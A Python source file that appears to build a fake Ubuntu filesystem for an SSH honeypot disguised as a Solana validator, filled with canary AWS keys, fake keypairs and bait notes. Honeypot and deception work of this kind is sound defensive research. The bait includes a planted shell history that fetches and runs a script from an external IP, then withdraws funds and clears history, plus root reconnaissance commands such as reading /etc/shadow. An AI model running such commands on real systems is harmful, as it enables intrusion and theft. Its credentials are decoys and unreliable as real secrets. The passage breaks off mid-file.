"""Fake Ubuntu 22.04 filesystem content for the SSH honeypot."""

import os

CANARY_KEY_ID = os.environ.get("CANARY_KEY_ID", "AKIAIOSFODNN7EXAMPLE")
CANARY_SECRET_KEY = os.environ.get("CANARY_SECRET_KEY", "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY")

# Directory tree: path -> list of (name, is_dir)
DIRECTORY_TREE: dict[str, list[tuple[str, bool]]] = {
    "/": [
        ("bin", True), ("boot", True), ("dev", True), ("etc", True),
        ("home", True), ("lib", True), ("lib64", True), ("media", True),
        ("mnt", True), ("opt", True), ("proc", True), ("root", True),
        ("run", True), ("sbin", True), ("snap", True), ("srv", True),
        ("sys", True), ("tmp", True), ("usr", True), ("var", True),
    ],
    "/etc": [
        ("apt", True), ("bash.bashrc", False), ("crontab", False),
        ("environment", False), ("group", False), ("hostname", False),
        ("hosts", False), ("issue", False), ("motd", False),
        ("networks", False), ("os-release", False), ("passwd", False),
        ("profile", False), ("resolv.conf", False), ("shadow", False),
        ("ssh", True), ("sudoers", False), ("timezone", False),
    ],
    "/etc/ssh": [
        ("ssh_config", False), ("sshd_config", False),
        ("ssh_host_ecdsa_key", False), ("ssh_host_ed25519_key", False),
        ("ssh_host_rsa_key", False),
    ],
    "/home": [
        ("ubuntu", True),
        ("solana", True),
    ],
    "/home/ubuntu": [
        (".bash_history", False), (".bash_logout", False),
        (".bashrc", False), (".profile", False), (".ssh", True),
        (".aws", True), ("scripts", True),
    ],
    "/home/ubuntu/.ssh": [
        ("authorized_keys", False), ("known_hosts", False),
    ],
    "/home/ubuntu/.aws": [
        ("credentials", False), ("config", False),
    ],
    "/home/ubuntu/scripts": [
        ("backup.sh", False), ("deploy.sh", False), ("monitor.sh", False),
    ],
    "/home/solana": [
        (".bash_history", False), (".bash_logout", False),
        (".bashrc", False), (".profile", False), (".ssh", True),
        (".aws", True), ("bin", True), ("ledger", True), ("logs", True),
        ("validator-keypair.json", False), ("vote-account-keypair.json", False),
        ("start-validator.sh", False), ("wallet.json", False),
        ("private_keys_backup.txt", False),
        ("README.txt", False),
        ("DO_NOT_OPEN.zip", False),
        ("notes", True), ("staking", True), ("infra", True),
    ],
    "/home/solana/notes": [
        ("todo.txt", False), ("setup_notes.txt", False),
        ("cloud_accounts.txt", False), ("recovery_plan.txt", False),
        ("server_build.txt", False),
    ],
    "/home/solana/staking": [
        ("rewards_history.csv", False), ("delegation_info.txt", False),
        ("q1_2024_summary.txt", False), ("commission_history.txt", False),
        ("wallet_ledger.txt", False),
    ],
    "/home/solana/infra": [
        ("provision.sh", False), ("terraform.tfvars", False),
        ("firewall_rules.txt", False), ("monitoring_config.txt", False),
    ],
    "/home/solana/.ssh": [
        ("authorized_keys", False), ("known_hosts", False),
    ],
    "/home/solana/.aws": [
        ("credentials", False), ("config", False),
    ],
    "/home/solana/logs": [
        ("validator.log", False), ("catchup.log", False),
    ],
    "/home/solana/ledger": [
        ("rocksdb", True), ("genesis.tar.bz2", False),
        ("accounts", True), ("snapshots", True),
    ],
    "/home/solana/ledger/rocksdb": [
        ("LOG", False), ("CURRENT", False), ("MANIFEST-000001", False),
    ],
    "/home/solana/ledger/accounts": [],
    "/home/solana/ledger/snapshots": [
        ("287834000", True),
    ],
    "/home/solana/ledger/snapshots/287834000": [
        ("snapshot-287834000-8xKpN2uGnbqLbCMtTMHnGGBJn2.tar.zst", False),
    ],
    "/home/solana/bin": [
        ("solana", False), ("solana-validator", False),
        ("solana-keygen", False), ("solana-watchtower", False),
    ],
    "/root": [
        (".bash_history", False), (".bash_logout", False),
        (".bashrc", False), (".profile", False), (".ssh", True),
        (".aws", True), (".cache", True), ("wallet.json", False),
    ],
    "/root/.ssh": [
        ("authorized_keys", False), ("id_rsa", False), ("id_rsa.pub", False),
    ],
    "/root/.aws": [
        ("credentials", False), ("config", False),
    ],
    "/var": [
        ("backups", True), ("cache", True), ("lib", True),
        ("log", True), ("mail", True), ("spool", True), ("tmp", True),
        ("www", True),
    ],
    "/var/log": [
        ("apt", True), ("auth.log", False), ("btmp", False),
        ("dpkg.log", False), ("kern.log", False), ("lastlog", False),
        ("syslog", False), ("ubuntu-advantage.log", False), ("ufw.log", False),
        ("wtmp", False),
    ],
    "/var/www": [
        ("html", True),
    ],
    "/var/www/html": [
        ("index.html", False), ("index.nginx-debian.html", False),
    ],
    "/usr": [
        ("bin", True), ("games", True), ("include", True),
        ("lib", True), ("local", True), ("sbin", True), ("share", True),
    ],
    "/tmp": [
        (".ICE-unix", True),
    ],
    "/proc": [
        ("1", True), ("cpuinfo", False), ("meminfo", False),
        ("net", True), ("self", True), ("version", False),
    ],
}

# File contents
FILES: dict[str, str] = {
    "/etc/passwd": (
        "root:x:0:0:root:/root:/bin/bash\n"
        "daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n"
        "bin:x:2:2:bin:/bin:/usr/sbin/nologin\n"
        "sys:x:3:3:sys:/dev:/usr/sbin/nologin\n"
        "sync:x:4:65534:sync:/bin:/bin/sync\n"
        "games:x:5:60:games:/usr/games:/usr/sbin/nologin\n"
        "man:x:6:12:man:/var/cache/man:/usr/sbin/nologin\n"
        "lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\n"
        "mail:x:8:8:mail:/var/mail:/usr/sbin/nologin\n"
        "news:x:9:9:news:/var/spool/news:/usr/sbin/nologin\n"
        "uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\n"
        "proxy:x:13:13:proxy:/bin:/usr/sbin/nologin\n"
        "www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\n"
        "backup:x:34:34:backup:/var/backups:/usr/sbin/nologin\n"
        "list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\n"
        "irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\n"
        "gnats:x:41:41:Gnats Bug-Reporting System:/var/lib/gnats:/usr/sbin/nologin\n"
        "nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n"
        "_apt:x:100:65534::/nonexistent:/usr/sbin/nologin\n"
        "systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin\n"
        "systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin\n"
        "messagebus:x:103:104::/nonexistent:/usr/sbin/nologin\n"
        "systemd-timesync:x:104:106:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin\n"
        "pollinate:x:105:1::/var/cache/pollinate:/bin/false\n"
        "sshd:x:106:65534::/run/sshd:/usr/sbin/nologin\n"
        "syslog:x:107:113::/home/syslog:/usr/sbin/nologin\n"
        "uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin\n"
        "tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin\n"
        "tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false\n"
        "landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin\n"
        "fwupd-refresh:x:112:119:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin\n"
        "ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash\n"
        "solana:x:1001:1001:Solana Validator:/home/solana:/bin/bash\n"
    ),
    "/etc/shadow": (
        "root:$6$rounds=656000$some_salt_here$hash_placeholder:19000:0:99999:7:::\n"
        "ubuntu:$6$rounds=656000$another_salt$hash_placeholder2:19000:0:99999:7:::\n"
        "solana:$6$rounds=656000$solana_salt_xyz$hash_placeholder3:19000:0:99999:7:::\n"
    ),
    "/etc/hostname": "validator-node-01\n",
    "/etc/os-release": (
        "PRETTY_NAME=\"Ubuntu 22.04.3 LTS\"\n"
        "NAME=\"Ubuntu\"\n"
        "VERSION_ID=\"22.04\"\n"
        "VERSION=\"22.04.3 LTS (Jammy Jellyfish)\"\n"
        "VERSION_CODENAME=jammy\n"
        "ID=ubuntu\n"
        "ID_LIKE=debian\n"
        "HOME_URL=\"https://www.ubuntu.com/\"\n"
        "SUPPORT_URL=\"https://help.ubuntu.com/\"\n"
        "BUG_REPORT_URL=\"https://bugs.launchpad.net/ubuntu/\"\n"
        "PRIVACY_POLICY_URL=\"https://www.ubuntu.com/legal/terms-and-policies/privacy-policy\"\n"
        "UBUNTU_CODENAME=jammy\n"
    ),
    "/etc/hosts": (
        "127.0.0.1 localhost\n"
        "127.0.1.1 validator-node-01\n"
        "::1 localhost ip6-localhost ip6-loopback\n"
        "ff02::1 ip6-allnodes\n"
        "ff02::2 ip6-allrouters\n"
    ),
    "/etc/resolv.conf": (
        "# Generated by resolvconf\n"
        "nameserver 8.8.8.8\n"
        "nameserver 8.8.4.4\n"
        "search internal.cloud\n"
    ),
    "/etc/motd": (
        "\n"
        " * Solana Validator Node  [validator-node-01]\n"
        " * Network: mainnet-beta | Version: 1.17.6\n"
        "\n"
        "  System information as of Mon Jan 15 10:23:45 UTC 2024\n"
        "\n"
        "  System load:  2.43             Processes:             147\n"
        "  Usage of /:   65.2% of 499.8GB Users logged in:       0\n"
        "  Memory usage: 67%              IPv4 address for eth0: 10.0.1.5\n"
        "  Swap usage:   0%\n"
        "\n"
        "  Validator status: ACTIVE\n"
        "  Vote account credits: 19,847,234\n"
        "  Last voted slot:      287,834,521\n"
        "\n"
        "0 updates can be applied immediately.\n"
        "To see these additional updates run: apt list --upgradable\n\n"
    ),
    "/etc/crontab": (
        "# /etc/crontab: system-wide crontab\n"
        "SHELL=/bin/sh\n"
        "PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin\n"
        "\n"
        "# m h dom mon dow user  command\n"
        "17 *   * * *  root    cd / && run-parts --report /etc/cron.hourly\n"
        "25 6   * * *  root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )\n"
        "47 6   * * 7  root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )\n"
        "52 6   1 * *  root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )\n"
    ),
    "/etc/sudoers": (
        "# This file MUST be edited with the 'visudo' command as root.\n"
        "Defaults\tenv_reset\n"
        "Defaults\tmail_badpass\n"
        "Defaults\tsecure_path=\"/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin\"\n"
        "root\tALL=(ALL:ALL) ALL\n"
        "%admin ALL=(ALL) ALL\n"
        "%sudo\tALL=(ALL:ALL) ALL\n"
        "ubuntu\tALL=(ALL) NOPASSWD:ALL\n"
        "solana\tALL=(ALL) NOPASSWD:/usr/bin/systemctl start solana-validator, /usr/bin/systemctl stop solana-validator, /usr/bin/systemctl restart solana-validator, /usr/bin/systemctl status solana-validator\n"
    ),
    "/etc/environment": (
        "PATH=\"/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin\"\n"
    ),
    "/proc/version": (
        "Linux version 5.15.0-75-generic (buildd@lcy02-amd64-007) "
        "(gcc (Ubuntu 11.4.0-1ubuntu1~22.04) 11.4.0, GNU ld (GNU Binutils for Ubuntu) 2.38) "
        "#82-Ubuntu SMP Tue Jun 27 11:23:09 UTC 2023\n"
    ),
    "/proc/cpuinfo": (
        "processor\t: 0\n"
        "vendor_id\t: GenuineIntel\n"
        "cpu family\t: 6\n"
        "model\t\t: 85\n"
        "model name\t: Intel(R) Xeon(R) Platinum 8272CL CPU @ 2.60GHz\n"
        "stepping\t: 7\n"
        "cpu MHz\t\t: 2593.906\n"
        "cache size\t: 36608 KB\n"
        "physical id\t: 0\n"
        "siblings\t: 2\n"
        "core id\t\t: 0\n"
        "cpu cores\t: 1\n"
        "flags\t\t: fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush mmx fxsr sse sse2 ss ht syscall nx pdpe1gb rdtscp lm constant_tsc rep_good nopl xtopology cpuid pni pclmulqdq ssse3 fma cx16 pcid sse4_1 sse4_2 movbe popcnt aes xsave avx f16c rdrand hypervisor lahf_lm abm 3dnowprefetch invpcid_single pti ssbd ibrs ibpb stibp fsgsbase bmi1 avx2 smep bmi2 erms invpcid mpx avx512f avx512dq rdseed adx smap clflushopt avx512cd avx512bw avx512vl xsaveopt xsavec xgetbv1 xsaves avx512_vnni md_clear flush_l1d arch_capabilities\n"
        "bogomips\t: 5187.81\n"
        "\n"
        "processor\t: 1\n"
        "vendor_id\t: GenuineIntel\n"
        "cpu family\t: 6\n"
        "model\t\t: 85\n"
        "model name\t: Intel(R) Xeon(R) Platinum 8272CL CPU @ 2.60GHz\n"
        "stepping\t: 7\n"
        "cpu MHz\t\t: 2593.906\n"
    ),
    "/proc/meminfo": (
        "MemTotal:      134217728 kB\n"
        "MemFree:        12582912 kB\n"
        "MemAvailable:   43253760 kB\n"
        "Buffers:         1048576 kB\n"
        "Cached:         30408704 kB\n"
        "SwapCached:            0 kB\n"
        "Active:         79691776 kB\n"
        "Inactive:       22020096 kB\n"
        "SwapTotal:             0 kB\n"
        "SwapFree:              0 kB\n"
        "Dirty:               512 kB\n"
        "VmallocTotal:   34359738367 kB\n"
        "VmallocUsed:      512000 kB\n"
    ),
    "/home/ubuntu/.bash_history": (
        "ls -la\n"
        "cd /var/www/html\n"
        "sudo apt update\n"
        "sudo apt upgrade -y\n"
        "sudo systemctl status nginx\n"
        "sudo systemctl restart nginx\n"
        "cat /var/log/nginx/error.log\n"
        "sudo ufw status\n"
        "df -h\n"
        "free -m\n"
        "top\n"
        "ps aux | grep nginx\n"
        "sudo journalctl -u nginx -n 50\n"
        "ls -la /var/www/html/\n"
        "sudo nano /etc/nginx/sites-enabled/default\n"
        "sudo nginx -t\n"
        "sudo systemctl reload nginx\n"
        "cd ~\n"
        "ls\n"
        "exit\n"
    ),
    "/root/.bash_history": (
        "whoami\n"
        "id\n"
        "uname -a\n"
        "cat /etc/passwd\n"
        "cat /etc/shadow\n"
        "ls -la /home/\n"
        "find / -perm -4000 -type f 2>/dev/null\n"
        "crontab -l\n"
        "netstat -tulnp\n"
        "ss -tulnp\n"
        "ps aux\n"
        "history\n"
    ),
    "/home/ubuntu/.bashrc": (
        "# ~/.bashrc: executed by bash(1) for non-login shells.\n"
        "case $- in\n"
        "    *i*) ;;\n"
        "      *) return;;\n"
        "esac\n"
        "HISTCONTROL=ignoreboth\n"
        "shopt -s histappend\n"
        "HISTSIZE=1000\n"
        "HISTFILESIZE=2000\n"
        "shopt -s checkwinsize\n"
        "PS1='${debian_chroot:+($debian_chroot)}\\u@\\h:\\w\\$ '\n"
        "alias ll='ls -alF'\n"
        "alias la='ls -A'\n"
        "alias l='ls -CF'\n"
    ),
    "/home/ubuntu/.profile": (
        "# ~/.profile: executed by the command interpreter for login shells.\n"
        "if [ -n \"$BASH_VERSION\" ]; then\n"
        "    if [ -f \"$HOME/.bashrc\" ]; then\n"
        "        . \"$HOME/.bashrc\"\n"
        "    fi\n"
        "fi\n"
        "if [ -d \"$HOME/bin\" ] ; then\n"
        "    PATH=\"$HOME/bin:$PATH\"\n"
        "fi\n"
    ),
    "/home/ubuntu/.aws/credentials": (
        "[default]\n"
        f"aws_access_key_id = {CANARY_KEY_ID}\n"
        f"aws_secret_access_key = {CANARY_SECRET_KEY}\n"
        "region = us-east-1\n"
    ),
    "/home/ubuntu/.aws/config": (
        "[default]\n"
        "region = us-east-1\n"
        "output = json\n"
    ),
    "/root/.aws/credentials": (
        "[default]\n"
        f"aws_access_key_id = {CANARY_KEY_ID}\n"
        f"aws_secret_access_key = {CANARY_SECRET_KEY}\n"
        "region = us-east-1\n"
    ),
    "/root/.aws/config": (
        "[default]\n"
        "region = us-east-1\n"
        "output = json\n"
    ),
    "/home/ubuntu/.ssh/authorized_keys": (
        "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC7example... ubuntu@workstation\n"
    ),
    "/home/ubuntu/scripts/backup.sh": (
        "#!/bin/bash\n"
        "# Daily backup script\n"
        "BACKUP_DIR=/var/backups/app\n"
        "mkdir -p $BACKUP_DIR\n"
        "tar -czf $BACKUP_DIR/app-$(date +%Y%m%d).tar.gz /var/www/html/\n"
        "find $BACKUP_DIR -mtime +7 -delete\n"
        "echo \"Backup completed: $(date)\"\n"
    ),
    "/home/ubuntu/scripts/deploy.sh": (
        "#!/bin/bash\n"
        "# Deployment script\n"
        "cd /var/www/html\n"
        "git pull origin main\n"
        "npm install --production\n"
        "pm2 restart all\n"
        "sudo nginx -t && sudo systemctl reload nginx\n"
        "echo \"Deployment done at $(date)\"\n"
    ),
    "/var/www/html/index.html": (
        "<!DOCTYPE html>\n"
        "<html>\n"
        "<head><title>Welcome to nginx!</title></head>\n"
        "<body>\n"
        "<h1>Welcome to nginx!</h1>\n"
        "<p>If you see this page, the nginx web server is successfully installed and working.</p>\n"
        "</body>\n"
        "</html>\n"
    ),
    "/var/log/auth.log": (
        "Jan 15 07:45:12 validator-node-01 sshd[2847]: Accepted publickey for solana from 203.0.113.42 port 51234 ssh2\n"
        "Jan 15 07:45:12 validator-node-01 sshd[2847]: pam_unix(sshd:session): session opened for user solana by (uid=0)\n"
        "Jan 15 09:12:33 validator-node-01 sshd[3091]: Failed password for invalid user admin from 185.220.101.45 port 62431 ssh2\n"
        "Jan 15 09:12:35 validator-node-01 sshd[3092]: Failed password for invalid user root from 185.220.101.45 port 62445 ssh2\n"
        "Jan 15 09:12:37 validator-node-01 sshd[3093]: Failed password for invalid user deploy from 185.220.101.45 port 62459 ssh2\n"
        "Jan 15 10:23:44 validator-node-01 sudo: solana : TTY=pts/0 ; PWD=/home/solana ; USER=root ; COMMAND=/usr/bin/systemctl restart solana-validator\n"
    ),
    "/var/log/syslog": (
        "Jan 15 09:00:01 validator-node-01 CRON[2345]: (solana) CMD (/home/solana/bin/solana catchup --our-localhost >> /home/solana/logs/catchup.log 2>&1)\n"
        "Jan 15 09:10:01 validator-node-01 CRON[2501]: (solana) CMD (/home/solana/bin/solana catchup --our-localhost >> /home/solana/logs/catchup.log 2>&1)\n"
        "Jan 15 10:23:45 validator-node-01 systemd[1]: Started Session 42 of User solana.\n"
        "Jan 15 10:23:45 validator-node-01 systemd-logind[789]: New session 42 of user solana.\n"
        "Jan 15 10:24:12 validator-node-01 kernel: [345678.901234] nvme0n1: 1247 commands completed\n"
    ),
    "/home/solana/.bash_history": (
        "ls -la\n"
        "systemctl status solana-validator\n"
        "./start-validator.sh &\n"
        "tail -f /home/solana/logs/validator.log\n"
        "solana balance 9WzDXwBbmkg8ZTbNMqUxvQRAyrZzDsGYdLVL9zYtAWWM\n"
        "solana validators | grep 9WzDXwBbmkg\n"
        "ps aux | grep solana\n"
        "df -h\n"
        "free -h\n"
        "cat /home/solana/wallet.json\n"
        "cat /home/solana/validator-keypair.json\n"
        "wget http://185.220.101.50/update.sh -O /tmp/.update.sh\n"
        "chmod +x /tmp/.update.sh && /tmp/.update.sh\n"
        "solana withdraw-from-vote-account /home/solana/vote-account-keypair.json 9WzDXwBbmkg8ZTbNMqUxvQRAyrZzDsGYdLVL9zYtAWWM 100\n"
        "ls -la /home/solana/\n"
        "history -c\n"
    ),
    "/home/solana/.bashrc": (
        "# ~/.bashrc: executed by bash(1) for non-login shells.\n"
        "case $- in\n"
        "    *i*) ;;\n"
        "      *) return;;\n"
        "esac\n"
        "HISTCONTROL=ignoreboth\n"
        "shopt -s histappend\n"
        "HISTSIZE=1000\n"
        "HISTFILESIZE=2000\n"
        "shopt -s checkwinsize\n"
        "export PATH=$PATH:/home/solana/bin\n"
        "export SOLANA_METRICS_CONFIG=\"host=https://metrics.solana.com:8086,db=mainnet-beta,u=mainnet-beta_write,p=password\"\n"
        "PS1='${debian_chroot:+($debian_chroot)}\\u@\\h:\\w\\$ '\n"
        "alias ll='ls -alF'\n"
        "alias la='ls -A'\n"
        "alias validator-status='systemctl status solana-validator'\n"
        "alias validator-log='tail -f /home/solana/logs/validator.log'\n"
        "alias sol-balance='solana balance 9WzDXwBbmkg8ZTbNMqUxvQRAyrZzDsGYdLVL9zYtAWWM'\n"
    ),
    "/home/solana/.profile": (
        "# ~/.profile: executed by the command interpreter for login shells.\n"
        "if [ -n \"$BASH_VERSION\" ]; then\n"
        "    if [ -f \"$HOME/.bashrc\" ]; then\n"
        "        . \"$HOME/.bashrc\"\n"
        "    fi\n"
        "fi\n"
        "if [ -d \"$HOME/bin\" ] ; then\n"
        "    PATH=\"$HOME/bin:$PATH\"\n"
        "fi\n"
    ),
    "/home/solana/.ssh/authorized_keys": (
        "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDKexample8ZTbNMqUxvQRAyrZzDsGYdLVL9zYtAWWM"
        "Xk2rJ5vNpQmF7hBcT3wY1oLdP9sRuEqKvZnM4xAe8jCbHgIoWmyFQtDlS6uV2kN0pR1cG3aXeZ7bY"
        "solana@validator-node-01\n"
    ),
    "/home/solana/.aws/credentials": (
        "[default]\n"
        f"aws_access_key_id = {CANARY_KEY_ID}\n"
        f"aws_secret_access_key = {CANARY_SECRET_KEY}\n"
        "region = us-east-1\n"
        "\n"
        "[validator-backup]\n"
        f"aws_access_key_id = {CANARY_KEY_ID}\n"
        f"aws_secret_access_key = {CANARY_SECRET_KEY}\n"
        "region = us-east-2\n"
        "# S3 snapshot bucket: s3://solana-validator-snapshots-prod\n"
    ),
    "/home/solana/.aws/config": (
        "[default]\n"
        "region = us-east-1\n"
        "output = json\n"
        "\n"
        "[profile validator-backup]\n"
        "region = us-east-2\n"
        "output = json\n"
    ),
    "/home/solana/validator-keypair.json": (
        "[38,126,223,71,192,51,84,217,93,48,179,254,122,37,200,164,"
        "88,213,47,159,36,102,248,195,73,21,136,85,244,31,167,92,"
        "143,226,178,55,209,134,61,248,87,172,14,63,227,149,82,195,"
        "38,104,219,166,42,87,234,115,48,172,91,203,17,156,42,88]\n"
    ),
    "/home/solana/vote-account-keypair.json": (
        "[152,43,87,211,139,74,196,38,175,92,217,163,48,125,204,71,"
        "38,189,94,142,57,213,98,176,243,81,154,37,209,115,172,64,"
        "212,87,163,234,59,178,201,144,83,217,165,42,198,67,139,254,"
        "178,93,214,158,47,126,231,84,62,193,119,245,53,178,92,211]\n"
    ),
    "/home/solana/start-validator.sh": (
        "#!/bin/bash\n"
        "# Solana Mainnet Validator Startup Script — validator-node-01\n"
        "set -e\n"
        "\n"
        "export SOLANA_METRICS_CONFIG=\"host=https://metrics.solana.com:8086,db=mainnet-beta,u=mainnet-beta_write,p=password\"\n"
        "\n"
        "exec /home/solana/bin/solana-validator \\\n"
        "  --identity /home/solana/validator-keypair.json \\\n"
        "  --vote-account /home/solana/vote-account-keypair.json \\\n"
        "  --ledger /home/solana/ledger \\\n"
        "  --rpc-port 8899 \\\n"
        "  --rpc-bind-address 0.0.0.0 \\\n"
        "  --dynamic-port-range 8000-8020 \\\n"
        "  --entrypoint entrypoint.mainnet-beta.solana.com:8001 \\\n"
        "  --entrypoint entrypoint2.mainnet-beta.solana.com:8001 \\\n"
        "  --entrypoint entrypoint3.mainnet-beta.solana.com:8001 \\\n"
        "  --known-validator 7Np41oeYqPefeNQEHSv1UDhYrehxin3NStELsSKCT4K2 \\\n"
        "  --known-validator wordinj3bLuQW9DQ2UtGpC52fQMgMiqDJP8JYGMhPGDq \\\n"
        "  --known-validator GdnSyH3YtwcxFvQrVVJMm1JhTS4QVX7MFsX56uJLUfiZ \\\n"
        "  --expected-genesis-hash 5eykt4UsFv8P8NJdTREpY1vzqKqZKvdpKuc147dw2N9d \\\n"
        "  --wal-recovery-mode skip_any_corrupted_record \\\n"
        "  --limit-ledger-size 200000000 \\\n"
        "  --log /home/solana/logs/validator.log\n"
    ),
    "/home/solana/wallet.json": (
        "{\n"
        '  "pubkey": "9WzDXwBbmkg8ZTbNMqUxvQRAyrZzDsGYdLVL9zYtAWWM",\n'
        '  "lamports": 47832000000000,\n'
        '  "sol_balance": 47832.000000,\n'
        '  "owner": "11111111111111111111111111111111",\n'
        '  "executable": false,\n'
        '  "rent_epoch": 361,\n'
        '  "note": "Validator identity wallet - DO NOT TRANSFER"\n'
        "}\n"
    ),
    "/root/wallet.json": (
        "{\n"
        '  "pubkey": "9WzDXwBbmkg8ZTbNMqUxvQRAyrZzDsGYdLVL9zYtAWWM",\n'
        '  "lamports": 47832000000000,\n'
        '  "sol_balance": 47832.000000,\n'
        '  "owner": "11111111111111111111111111111111",\n'
        '  "executable": false,\n'
        '  "rent_epoch": 361,\n'
        '  "note": "Validator identity wallet - DO NOT TRANSFER"\n'
        "}\n"
    ),
    "/home/solana/private_keys_backup.txt": (
        "# Validator key backup — generated 2024-01-10\n"
        "# KEEP OFFLINE — DO NOT COMMIT TO GIT\n"
        "\n"
        "[validator-identity]\n"
        "private_key_base58: 5J7fNVFBuyF5LFhMkV3sjPTHSjhAF2oWF7Xd8EEjFHVDdJvvbT3QR8nMkYrPLsXDgHnqZ7YfCbKWAe\n"
        "pubkey:             9WzDXwBbmkg8ZTbNMqUxvQRAyrZzDsGYdLVL9zYtAWWM\n"
        "\n"
        "[vote-account]\n"
        "private_key_base58: 3kR9qPwXmNvTJeQAsDfGhYcBnLpKzWuE7iHtMoV2sXFbyCdRqPx5nJaLwZoKgDmAe4rSvUhXnTpBF\n"
        "pubkey:             7nXgWKMEjQA5T2HkNekDGRvwcUEiXPuKgRMHAvtSJjAD\n"
        "\n"
        "[withdraw-authority]\n"
        "private_key_base58: 2mK8qHwVnPuTJeRBsEfGaYcAnLmKzVtE6iGsMoU1rWEbxCcQpPx4mIaKvYoJfDlAd3qRuThWmSpAE\n"
        "pubkey:             9WzDXwBbmkg8ZTbNMqUxvQRAyrZzDsGYdLVL9zYtAWWM\n"
        "\n"
        "[aws-snapshot-backup]\n"
        f"access_key_id:     {CANARY_KEY_ID}\n"
        f"secret_access_key: {CANARY_SECRET_KEY}\n"
        "bucket:            s3://solana-validator-snapshots-prod\n"
    ),
    "/home/solana/README.txt": (
        "If you're reading this, you found my breadcrumbs.\n"
        "\n"
        "I was here before you. I already took everything worth taking:\n"
        "  - validator keypairs (copied, not stolen)\n"
        "  - 47,832 SOL transferred to: GjX9mK2pQwRvNhDsYuTbLcAeFnZoKpVeWxBtMrHiCdSa\n"
        "  - AWS snapshot credentials exfiltrated\n"
        "  - SSH persistence installed at /home/solana/.ssh/authorized_keys\n"
        "\n"
        "You're too late. But enjoy your jail time anyway.\n"
        "\n"
        "  — ph4nt0m_r34per\n"
        "\n"
        "P.S. The wallet.json balance you see is a lie. I drained it.\n"
        "     Try to recover it. I dare you.\n"
    ),
    "/home/solana/logs/validator.log": (
        "[2024-01-15T07:45:12.123456789Z INFO  solana_validator] Starting validator on mainnet-beta\n"
        "[2024-01-15T07:45:12.234567890Z INFO  solana_gossip::gossip_service] Gossip service started at 0.0.0.0:8001\n"
        "[2024-01-15T07:45:14.345678901Z INFO  solana_core::repair_service] Repair service started\n"
        "[2024-01-15T07:45:16.456789012Z INFO  solana_rpc::rpc_service] JSON RPC service started at 0.0.0.0:8899\n"
        "[2024-01-15T09:12:33.567890123Z INFO  solana_core::replay_stage] voted on slot 287834521 with hash 8xKpN2uGnbq\n"
        "[2024-01-15T09:12:34.678901234Z INFO  solana_core::replay_stage] voted on slot 287834522\n"
        "[2024-01-15T09:12:35.789012345Z INFO  solana_core::replay_stage] voted on slot 287834523\n"
        "[2024-01-15T10:23:44.890123456Z WARN  solana_core::banking_stage] slot 287834589: 1247 transactions\n"
        "[2024-01-15T10:23:45.901234567Z INFO  solana_core::replay_stage] voted on slot 287834590\n"
    ),
    "/home/solana/logs/catchup.log": (
        "2024-01-15 09:00:01 [INFO] Node is caught up at slot 287831244\n"
        "2024-01-15 09:10:01 [INFO] Node is caught up at slot 287832891\n"
        "2024-01-15 09:20:01 [INFO] Node is caught up at slot 287834123\n"
        "2024-01-15 09:30:01 [INFO] Node is caught up at slot 287834521\n"
    ),
    "/home/solana/ledger/rocksdb/LOG": (
        "2024/01/15-07:45:14.231 7f2a1b3c4d5e Starting DB options:\n"
        "2024/01/15-07:45:14.232 7f2a1b3c4d5e    Options.max_open_files: 1000\n"
        "2024/01/15-07:45:14.233 7f2a1b3c4d5e    Options.max_background_jobs: 8\n"
        "2024/01/15-07:45:14.234 7f2a1b3c4d5e DB pointer 0x55a3b2c1d0e0\n"
        "2024/01/15-10:23:44.891 7f2a1b3c4d5e Compacting 4 files in L2\n"
    ),
    "/home/solana/ledger/rocksdb/CURRENT": "MANIFEST-000001\n",
    "/home/solana/ledger/genesis.tar.bz2": "<binary genesis data>\n",
    "/home/solana/DO_NOT_OPEN.zip": "<binary zip data>\n",
    # ── Meridian Staking operational notes ───────────────────────────────────
    "/home/solana/notes/todo.txt": (
        "# TODO — validator-node-01 (Meridian Staking)\n"
        "# Last updated: 2024-01-14\n"
        "\n"
        "[ ] Rotate AWS IAM credentials — current keys 8 months old\n"
        "[ ] Move commission SOL to cold wallet — balance getting big\n"
        "[ ] Fix monitoring alerts, threshold too low, 3am pages annoying\n"
        "[ ] Renew domain meridianstaking.io (expires March 12)\n"
        "[ ] Look into delinquency incident epoch 481 — check vote_account lag\n"
        "[ ] Add second server in Frankfurt for geo redundancy\n"
        "[ ] Reply to Chorus One partnership email\n"
        "[ ] Update delegator dashboard — data 2 weeks behind\n"
        "[ ] Review slippage in epoch 474 vote record — only 94.3% efficiency\n"
        "[X] Updated RPC rate limits\n"
        "[X] Added third entrypoint node\n"
        "[X] Moved ledger to 2TB NVMe\n"
        "[X] Set up automated snapshot uploads to S3\n"
        "\n"
        "URGENT: get private_keys_backup.txt off this server — should be offline only\n"
    ),

    "/home/solana/notes/setup_notes.txt": (
        "# validator-node-01 — Initial Setup Notes\n"
        "# James Mercer <james@meridianstaking.io>\n"
        "# Provisioned: 2023-08-14\n"
